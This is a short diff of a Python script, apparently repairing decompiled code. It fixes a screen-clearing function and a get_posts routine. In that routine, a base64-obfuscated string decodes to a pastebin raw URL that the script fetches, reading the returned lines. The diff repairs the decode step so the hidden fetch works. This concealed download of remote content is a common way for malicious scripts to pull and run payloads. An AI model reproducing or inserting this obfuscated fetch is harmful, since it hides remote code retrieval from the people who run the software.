@@ -103,11 +103,10 @@ def cls():
     if system() == 'Linux':
         os.system('clear')
         return None
-    if None() == 'Windows':
+    if system() == 'Windows':
         os.system('cls')
         return None
-
-return None
+    return None
 
 cls()
 CLEAR_SCREEN = '\033[2J'
@@ -228,7 +227,7 @@ def get_posts():
 		
 qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3liakNnZjVm"
 www = base64.b64decode(qqq)
-eee = www. decode("utf-8")
+eee = www.decode("utf-8")
 rrr = requests.get(eee)
 for linee in rrr:
 	mmm = linee.decode("utf-8")
